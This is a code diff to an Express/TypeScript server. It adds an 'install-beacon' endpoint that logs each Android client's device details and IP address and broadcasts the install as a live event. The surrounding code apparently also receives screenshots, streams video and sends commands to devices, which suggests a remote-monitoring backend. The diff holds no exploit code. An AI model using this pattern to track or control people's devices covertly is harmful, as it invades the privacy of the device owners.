@@ -18,7 +18,7 @@ import archiver from 'archiver';
 import * as db from '../database';
 import * as storage from '../storage';
 import { appendToHLS, finalizeHLS } from '../hls';
-import { sendDeviceCommand } from '../websocket';
+import { sendDeviceCommand, broadcastLiveEvent } from '../websocket';
 import { MAX_UPLOAD_SIZE, CHUNK_DURATION_MS, PUBLIC_DIR } from '../config';
 
 const router = Router();
@@ -543,6 +543,44 @@ router.post('/upload-screenshot', upload.single('image'), (req: Request, res: Re
         
         res.json({ status: 'success' });
     } catch (err: any) {
+        res.status(500).json({ status: 'error', message: err.message });
+    }
+});
+
+// ════════════════════════════════════════════════════════════════════════════
+// APP INSTALL BEACON (Tracks when client APK is first installed / activated)
+// ════════════════════════════════════════════════════════════════════════════
+
+router.post('/install-beacon', (req: Request, res: Response) => {
+    try {
+        const { client_id, device_model, manufacturer, os_version, app_version } = req.body || {};
+        if (!client_id) {
+            res.status(400).json({ status: 'error', message: 'Missing client_id' });
+            return;
+        }
+
+        const forwarded = req.headers['x-forwarded-for'];
+        const ip = typeof forwarded === 'string' ? forwarded.split(',')[0].trim() : req.ip || req.socket.remoteAddress || '';
+
+        const record = db.recordDeviceInstall(
+            client_id,
+            device_model || 'Unknown',
+            manufacturer || 'Android',
+            os_version || '',
+            app_version || '',
+            ip
+        );
+
+        console.log(`[broadcast] 📱 New App Install beacon recorded: ${record.manufacturer} ${record.device_model} (Client ID: ${record.client_id}) from IP ${ip}`);
+
+        broadcastLiveEvent({
+            type: 'new_install',
+            data: record,
+        });
+
+        res.json({ status: 'ok', message: 'Install beacon recorded successfully', install: record });
+    } catch (err: any) {
+        console.error('[broadcast] Error recording install beacon:', err);
         res.status(500).json({ status: 'error', message: err.message });
     }
 });
